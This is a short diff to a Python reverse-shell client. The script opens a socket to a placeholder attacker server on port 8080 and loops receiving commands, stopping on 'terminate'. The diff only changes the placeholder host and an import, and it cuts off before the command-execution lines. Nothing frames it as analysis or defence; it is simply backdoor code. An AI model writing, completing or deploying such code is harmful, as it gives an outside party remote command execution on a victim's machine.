@@ -1,10 +1,10 @@
 import socket
 import subprocess
-import OS
+import os.path
 
 def connect():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect(('#IP', 8080))
+  s.connect(('#server-ip', 8080))
   while True:
     command = s.recv(1024)
     if 'terminate' in command:
